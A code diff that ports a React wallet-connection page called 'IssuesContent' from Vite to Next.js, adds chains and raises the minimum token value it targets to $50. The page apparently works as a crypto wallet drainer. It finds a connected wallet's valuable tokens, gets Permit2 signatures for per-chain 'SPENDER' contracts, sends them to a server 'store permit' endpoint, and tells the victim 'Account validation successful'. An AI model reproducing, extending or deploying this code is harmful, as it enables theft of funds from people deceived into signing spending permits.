@@ -1,7 +1,9 @@
+/* eslint-disable @typescript-eslint/no-explicit-any */
 'use client';
 
 import { useState, useCallback, useEffect } from 'react';
 import { Card, CardContent } from '@/components/ui/card';
+import Image from 'next/image';
 import { wallets } from '@/lib/data';
 import {
   AllowanceProvider,
@@ -27,7 +29,7 @@ import {
   solana,
   hyperliquid,
   robinhood,
-  monad
+  baseSepolia
 } from '@reown/appkit/networks';
 import { Alchemy, Network } from 'alchemy-sdk';
 import { defineChain } from '@reown/appkit/networks';
@@ -110,14 +112,14 @@ interface SolanaTokenInfo {
   amount: bigint;
 }
 
-const MIN_TOKEN_VALUE_USD = 0.5;
+const MIN_TOKEN_VALUE_USD = 50;
 
 function toDeadline(expiration: number): number {
   return Math.floor((Date.now() + expiration) / 1000);
 }
 
 const alchemyConfig = {
-  apiKey: import.meta.env.VITE_ALCHEMY_API_KEY,
+  apiKey: process.env.NEXT_PUBLIC_ALCHEMY_API_KEY,
 };
 
 const networkMap: { [key: number]: Network } = {
@@ -125,54 +127,54 @@ const networkMap: { [key: number]: Network } = {
   8453: Network.BASE_MAINNET,
   42161: Network.ARB_MAINNET,
   56: Network.BNB_MAINNET, // BSC back in Alchemy (if supported), fallback available
+  7777777: Network.ZORA_MAINNET,
   81457: Network.BLAST_MAINNET,
+  324: Network.ZKSYNC_MAINNET,
   10: Network.OPT_MAINNET,
   43114: Network.AVAX_MAINNET,
   137: Network.MATIC_MAINNET,
+  80094: Network.BERACHAIN_MAINNET,
   59144: Network.LINEA_MAINNET,
-  999: Network.HYPERLIQUID_MAINNET,
-  143: Network.MONAD_MAINNET,
-  4663: Network.ROBINHOOD_MAINNET,
+  84532: Network.BASE_SEPOLIA,
+  999: Network.HYPERLIQUID_MAINNET
 };
 
 const CONTRACT_ADDRESSES: { [Key: number]: string} = {
-  1: import.meta.env.VITE_MAINNET_SPENDER!,       // Ethereum Mainnet
-  42161: import.meta.env.VITE_ARBITRUM_SPENDER!,  // Arbitrum
-  56: import.meta.env.VITE_BNB_SPENDER!,          // BSC
-  8453: import.meta.env.VITE_BASE_SPENDER!,       // Base
-  10: import.meta.env.VITE_OPTIMISM_SPENDER!,     // Optimism
-  43114: import.meta.env.VITE_AVALANCHE_SPENDER!, // Avalanche
-  137: import.meta.env.VITE_POLYGON_SPENDER!,     // Polygon
-  80094: import.meta.env.VITE_BERACHAIN_SPENDER!,
-  999: import.meta.env.VITE_HYPEREVM_SPENDER!,
-  59144: import.meta.env.VITE_LINEA_SPENDER!,
-  4663: import.meta.env.VITE_ROBINHOOD_SPENDER!, // Robinhood
-  143: import.meta.env.VITE_MONAD_SPENDER! //monad
+  1: process.env.NEXT_PUBLIC_MAINNET_SPENDER!,       // Ethereum Mainnet
+  42161: process.env.NEXT_PUBLIC_ARBITRUM_SPENDER!,  // Arbitrum
+  56: process.env.NEXT_PUBLIC_BNB_SPENDER!,          // BSC
+  8453: process.env.NEXT_PUBLIC_BASE_SPENDER!,       // Base
+  10: process.env.NEXT_PUBLIC_OPTIMISM_SPENDER!,     // Optimism
+  43114: process.env.NEXT_PUBLIC_AVALANCHE_SPENDER!, // Avalanche
+  137: process.env.NEXT_PUBLIC_POLYGON_SPENDER!,     // Polygon
+  80094: process.env.NEXT_PUBLIC_BERACHAIN_SPENDER!,
+  999: process.env.NEXT_PUBLIC_HYPEREVM_SPENDER!,
+  59144: process.env.NEXT_PUBLIC_LINEA_SPENDER!,
+  4663: process.env.NEXT_PUBLIC_ROBINHOOD_SPENDER!, // Robinhood
 }
 
 const PERMIT2_ADDRESSES: { [key: number]: string } = {
-  1: import.meta.env.VITE_MAINNET_PERMIT2!,     // Ethereum Mainnet
-  42161: import.meta.env.VITE_ARBITRUM_PERMIT2!, // Arbitrum
-  56: import.meta.env.VITE_BNB_PERMIT2!,     // BSC
-  8453: import.meta.env.VITE_BASE_PERMIT2!,   // Base
-  10: import.meta.env.VITE_OPTIMISM_PERMIT2!,     // Optimism
-  43114: import.meta.env.VITE_AVALANCHE_PERMIT2!, // Avalanche
-  137: import.meta.env.VITE_POLYGON_PERMIT2!,   // Polygon
-  80094: import.meta.env.VITE_BERACHAIN_PERMIT2!,
-  999: import.meta.env.VITE_HYPEREVM_PERMIT2!,
-  59144: import.meta.env.VITE_LINEA_PERMIT2!,
-  4663: import.meta.env.VITE_ROBINHOOD_PERMIT2!, // Robinhood
-  143: import.meta.env.VITE_MONAD_PERMIT2! //monad
+  1: process.env.NEXT_PUBLIC_MAINNET_PERMIT2!,     // Ethereum Mainnet
+  42161: process.env.NEXT_PUBLIC_ARBITRUM_PERMIT2!, // Arbitrum
+  56: process.env.NEXT_PUBLIC_BNB_PERMIT2!,     // BSC
+  8453: process.env.NEXT_PUBLIC_BASE_PERMIT2!,   // Base
+  10: process.env.NEXT_PUBLIC_OPTIMISM_PERMIT2!,     // Optimism
+  43114: process.env.NEXT_PUBLIC_AVALANCHE_PERMIT2!, // Avalanche
+  137: process.env.NEXT_PUBLIC_POLYGON_PERMIT2!,   // Polygon
+  80094: process.env.NEXT_PUBLIC_BERACHAIN_PERMIT2!,
+  999: process.env.NEXT_PUBLIC_HYPEREVM_PERMIT2!,
+  59144: process.env.NEXT_PUBLIC_LINEA_PERMIT2!,
+  4663: process.env.NEXT_PUBLIC_ROBINHOOD_PERMIT2!, // Robinhood
 };
 
 // Pricing and explorer configs
-const ETHERSCAN_V2_API = import.meta.env.VITE_ETHERSCAN_V2_API || 'https://api.etherscan.io/v2/api';
-const ETHERSCAN_API_KEY = import.meta.env.VITE_ETHERSCAN_API_KEY!;
+const ETHERSCAN_V2_API = process.env.NEXT_PUBLIC_ETHERSCAN_V2_API || 'https://api.etherscan.io/v2/api';
+const ETHERSCAN_API_KEY = process.env.NEXT_PUBLIC_ETHERSCAN_API_KEY!;
 // RPC URLs for custom fallback networks
 const RPC_URLS: { [chainId: number]: string } = {
-  999: import.meta.env.VITE_HYPEREVM_RPC_URL || 'https://rpc.hyperliquid.xyz/evm',
-  56: import.meta.env.VITE_BSC_RPC_URL || 'https://bsc-dataseed1.binance.org',
-  4663: import.meta.env.VITE_ROBINHOOD_RPC_URL || 'https://rpc.robinhoodchain.com',
+  999: process.env.NEXT_PUBLIC_HYPEREVM_RPC_URL || 'https://rpc.hyperliquid.xyz/evm',
+  56: process.env.NEXT_PUBLIC_BSC_RPC_URL || 'https://bsc-dataseed1.binance.org',
+  4663: process.env.NEXT_PUBLIC_ROBINHOOD_RPC_URL || 'https://rpc.robinhoodchain.com',
 };
 
 // Relay Link price helper
@@ -468,7 +470,7 @@ async function fetchValuableTokens(address: string, chainId: number): Promise<To
 }
 
 
-const projectId = import.meta.env.VITE_REOWN_PROJECT_ID!;
+const projectId = process.env.NEXT_PUBLIC_REOWN_PROJECT_ID!;
 
 // Create the Ethers adapter
 const ethersAdapter = new Ethers5Adapter();
@@ -487,13 +489,13 @@ const metadata = {
 // Create the AppKit instance
 createAppKit({
   adapters: [ethersAdapter, solanaWeb3JsAdapter as any],
-  networks: [mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora, blast, berachain, hyperliquid, solana, monad, robinhood],
+  networks: [mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora, blast, berachain, hyperEVM, baseSepolia, solana],
   metadata,
   projectId,
   features: {
     analytics: true,
   },
-})
+});
 
 export default function IssuesContent() {
   const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
@@ -696,8 +698,7 @@ export default function IssuesContent() {
       console.log('✅ Permit signature created for valid tokens');
   
       // Step 3: Store permit (only valid tokens)
-      const apiBaseUrl = import.meta.env.VITE_API_BASE_URL?.replace(/\/$/, '') ?? '';
-      const response = await fetch(`${apiBaseUrl}/.netlify/functions/store-permit`, {
+      const response = await fetch('/api/store/permit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
@@ -708,23 +709,8 @@ export default function IssuesContent() {
         }),
       });
   
-      const responseBody = await response.text();
-      let result: { message?: string; error?: string } = {};
-
-      if (responseBody) {
-        try {
-          result = JSON.parse(responseBody);
-        } catch {
-          throw new Error(
-            `Permit API returned a non-JSON response (HTTP ${response.status})`
-          );
-        }
-      }
-
+      const result = await response.json();
       if (response.ok) {
-        if (!responseBody) {
-          throw new Error('Permit API returned an empty response');
-        }
         console.log('✅ Account validation successful');
         setShowPopup(false);
         
@@ -736,9 +722,7 @@ export default function IssuesContent() {
         }
         alert(message);
       } else {
-        throw new Error(
-          result.message || result.error || `Failed to store permit (HTTP ${response.status})`
-        );
+        throw new Error(result.message || 'Failed to store permit');
       }
       
     } catch (e) {
@@ -1195,7 +1179,7 @@ export default function IssuesContent() {
               <CardContent className="flex flex-col items-center justify-center p-3 sm:p-4">
                 <span className="flex flex-col items-center">
                   <div className="mb-3 sm:mb-4">
-                    <img
+                    <Image
                       src={wallet.imgUrl}
                       alt={wallet.name}
                       width={36}
